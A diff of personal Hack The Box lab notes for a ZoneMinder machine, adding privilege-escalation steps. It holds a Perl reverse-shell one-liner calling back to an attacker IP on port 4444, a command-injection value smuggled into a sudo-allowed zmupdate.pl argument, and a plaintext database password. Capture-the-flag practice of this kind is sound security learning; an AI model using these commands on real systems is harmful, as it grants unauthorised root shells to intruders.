@@ -1,7 +1,7 @@
 COMMON
 -----
 https://github.com/y3rb1t4/htb-arg/blob/main/00-my-notes/shell-interactive.md
-
+ss -tunl
 
 USER FLAG
 -----
@@ -76,20 +76,29 @@ Configure::write('ZM_API_VERSION', '1.36.32.1');
 
 https://github.com/rvizx/CVE-2023-26035
 
-Investigate: 
-zmaudit.pl
-zmcontrol.pl
-zmdc.pl
-zmfilter.pl
-zmonvif-probe.pl
-zmonvif-trigger.pl
-zmpkg.pl
-zmmrecover.pl
-zmstats.pl
-zmsystemctl.pl
-zmtelemetry.pl
-zmtrack.pl
-zmtrigger.pl
-zmupdate.pl
-zmvideo.pl
-zmwatch.pl
+sudo -l
+
+```shell
+sudo -l
+
+(ALL : ALL) NOPASSWD: /usr/bin/zm[a-zA-Z]*.pl *
+```
+
+cat /usr/bin/zm*.pl | grep "user"
+
+shows two files with information about the user and password
+
+- zmcamtool.pl
+- zmupdate.pl
+
+sudo /usr/bin/zmcamtool.pl --user="zmuser" --pass="ZoneMinderPassword2023" ## Not work
+
+touch /tmp/rs.pl
+
+```perl
+use Socket;$i="10.10.14.137";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};
+```
+
+sudo /usr/bin/zmupdate.pl --user='$(perl /tmp/rs.pl)' --pass="asd" ## Reverse shell here
+
+https://www.hackthebox.com/achievement/machine/834305/580
